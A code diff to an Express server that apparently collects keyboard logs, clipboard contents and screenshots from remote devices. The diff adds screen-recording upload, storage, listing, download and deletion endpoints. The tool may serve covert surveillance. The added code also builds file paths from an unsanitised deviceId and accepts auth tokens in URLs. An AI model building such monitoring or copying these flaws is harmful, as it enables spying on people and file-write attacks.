@@ -12,6 +12,7 @@ const MAX_AUDIT = Number(process.env.MAX_AUDIT) || 200;
 const MAX_CLIPBOARD = Number(process.env.MAX_CLIPBOARD) || 300;
 const MAX_KEYBOARD = Number(process.env.MAX_KEYBOARD) || 300;
 const MAX_SCREENSHOTS = Number(process.env.MAX_SCREENSHOTS) || 80;
+const MAX_RECORDINGS = Number(process.env.MAX_RECORDINGS) || 20;
 
 const agents = new Map();
 const agentMeta = new Map();
@@ -21,7 +22,13 @@ const auditLog = [];
 const clipboardLog = new Map();
 const keyboardLog = new Map();
 const screenshotLog = new Map();
+const recordingLog = new Map();
 const downloadsDir = path.join(__dirname, "..", "downloads");
+const recordingsDir = path.join(__dirname, "..", "data", "recordings");
+
+if (!fs.existsSync(recordingsDir)) {
+  fs.mkdirSync(recordingsDir, { recursive: true });
+}
 
 const app = express();
 app.use(express.json());
@@ -245,6 +252,96 @@ function clearScreenshotEntries(deviceId) {
   screenshotLog.set(deviceId, []);
 }
 
+function findRecordingEntry(recordingId) {
+  for (const [deviceId, list] of recordingLog) {
+    const entry = list.find((e) => e.id === recordingId);
+    if (entry) return { deviceId, entry };
+  }
+  return null;
+}
+
+function deleteRecordingFile(filename) {
+  if (!filename) return;
+  try {
+    fs.unlinkSync(path.join(recordingsDir, filename));
+  } catch {
+    // ignore missing files
+  }
+}
+
+function addRecordingEntry(deviceId, msg) {
+  if (!recordingLog.has(deviceId)) recordingLog.set(deviceId, []);
+  const list = recordingLog.get(deviceId);
+  const id = `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
+  const filename = `${deviceId}-${id}.mp4`;
+  const buf = Buffer.from(String(msg.data || ""), "base64");
+  fs.writeFileSync(path.join(recordingsDir, filename), buf);
+  const entry = {
+    id,
+    time: msg.time || new Date().toISOString(),
+    duration: Number(msg.duration) || 0,
+    width: Number(msg.width) || 0,
+    height: Number(msg.height) || 0,
+    size: buf.length,
+    filename,
+  };
+  list.unshift(entry);
+  while (list.length > MAX_RECORDINGS) {
+    const removed = list.pop();
+    deleteRecordingFile(removed?.filename);
+  }
+  return entry;
+}
+
+function getRecordingEntries(deviceId, limit) {
+  const list = recordingLog.get(deviceId) || [];
+  return list
+    .slice(0, limit)
+    .map(({ id, time, duration, width, height, size }) => ({
+      id,
+      time,
+      duration,
+      width,
+      height,
+      size,
+    }));
+}
+
+function clearRecordingEntries(deviceId) {
+  const list = recordingLog.get(deviceId) || [];
+  for (const entry of list) deleteRecordingFile(entry.filename);
+  recordingLog.set(deviceId, []);
+}
+
+function notifyRecordingUpload(deviceId, msg) {
+  const entry = addRecordingEntry(deviceId, msg);
+  addAudit("recording", {
+    deviceId,
+    duration: entry.duration,
+    width: entry.width,
+    height: entry.height,
+    size: entry.size,
+  });
+  const payload = {
+    type: "recording_uploaded",
+    deviceId,
+    entry: {
+      id: entry.id,
+      time: entry.time,
+      duration: entry.duration,
+      width: entry.width,
+      height: entry.height,
+      size: entry.size,
+    },
+  };
+  const set = viewers.get(deviceId);
+  if (set) {
+    for (const viewer of set) send(viewer, payload);
+  }
+  broadcastDashboard("recording_uploaded", payload);
+  return entry;
+}
+
 function notifyScreenshotCapture(deviceId, msg) {
   const entry = addScreenshotEntry(deviceId, msg);
   addAudit("screenshot", {
@@ -350,6 +447,27 @@ app.get("/api/screenshots", authMiddleware, (req, res) => {
   res.json({ deviceId, entries: getScreenshotEntries(deviceId, limit) });
 });
 
+app.get("/api/recordings", authMiddleware, (req, res) => {
+  const deviceId = req.query.deviceId;
+  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
+  const limit = Math.min(Number(req.query.limit) || MAX_RECORDINGS, MAX_RECORDINGS);
+  res.json({ deviceId, entries: getRecordingEntries(deviceId, limit) });
+});
+
+app.get("/api/recordings/:id/file", (req, res) => {
+  const token =
+    req.headers.authorization?.replace(/^Bearer\s+/i, "") || req.query.token || "";
+  if (!verifyToken(token)) {
+    return res.status(401).send("unauthorized");
+  }
+  const found = findRecordingEntry(req.params.id);
+  if (!found) return res.status(404).send("not found");
+  const filePath = path.join(recordingsDir, found.entry.filename);
+  if (!fs.existsSync(filePath)) return res.status(404).send("file missing");
+  res.setHeader("Content-Type", "video/mp4");
+  res.sendFile(filePath);
+});
+
 app.delete("/api/clipboard", authMiddleware, (req, res) => {
   const deviceId = req.query.deviceId;
   if (!deviceId) return res.status(400).json({ error: "deviceId required" });
@@ -374,6 +492,14 @@ app.delete("/api/screenshots", authMiddleware, (req, res) => {
   res.json({ ok: true, deviceId });
 });
 
+app.delete("/api/recordings", authMiddleware, (req, res) => {
+  const deviceId = req.query.deviceId;
+  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
+  clearRecordingEntries(deviceId);
+  addAudit("recording_clear", { deviceId });
+  res.json({ ok: true, deviceId });
+});
+
 app.post(
   "/api/screenshots/upload",
   express.json({ limit: "12mb" }),
@@ -392,6 +518,30 @@ app.post(
         width: entry.width,
         height: entry.height,
         data: entry.data,
+      },
+    });
+  }
+);
+
+app.post(
+  "/api/recordings/upload",
+  express.json({ limit: "50mb" }),
+  authMiddleware,
+  (req, res) => {
+    const deviceId = req.body?.deviceId;
+    if (!deviceId || !req.body?.data) {
+      return res.status(400).json({ error: "deviceId and data required" });
+    }
+    const entry = notifyRecordingUpload(deviceId, req.body);
+    res.json({
+      ok: true,
+      entry: {
+        id: entry.id,
+        time: entry.time,
+        duration: entry.duration,
+        width: entry.width,
+        height: entry.height,
+        size: entry.size,
       },
     });
   }
